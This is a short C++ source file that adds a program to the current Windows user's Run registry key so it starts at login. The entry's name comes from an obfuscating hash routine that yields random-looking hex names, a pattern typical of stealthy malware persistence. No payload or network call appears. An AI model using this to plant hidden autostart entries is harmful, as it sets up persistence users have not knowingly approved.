#include <Windows.h>
#include <sstream>
#include <iomanip>
#include <codecvt>

#include "_startup.h"
#include "_utils.hpp"

namespace startup {
	const char* STARTUP_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	const char* SUFFIX_KEY = "\"/2";

	string genSuffix(int n) {
		uint64_t base = 0x3CF3AF9B;

		for (int i = 0; i < 8; ++i) {
			base = (base * 4984328) ^ (n + i * 2);
		}

		std::stringstream str;
		str << std::hex << std::setfill('0');

		for (int i = 0; i < 3; ++i) {
			str << std::setw(8) << ((base >> (i * 16)) & 0x87FE9EFF);
		}

		return str.str() + startup::SUFFIX_KEY;
	}

	bool createRegKey(const string& name, const wstring& data) {
		HKEY handle = NULL;

		LONG result = RegOpenKeyExA(
			HKEY_CURRENT_USER,
			startup::STARTUP_PATH,
			NULL, KEY_SET_VALUE,
			&handle
		);

		if (result != ERROR_SUCCESS)
			return false;

		string wData = utils::wstringToString(data);
		RegSetValueExA(
			handle,
			name.c_str(),
			NULL, REG_SZ,
			(CONST BYTE*)wData.c_str(),
			(DWORD)wData.length() + 1
		);

		RegCloseKey(handle);

		return true;
	}
}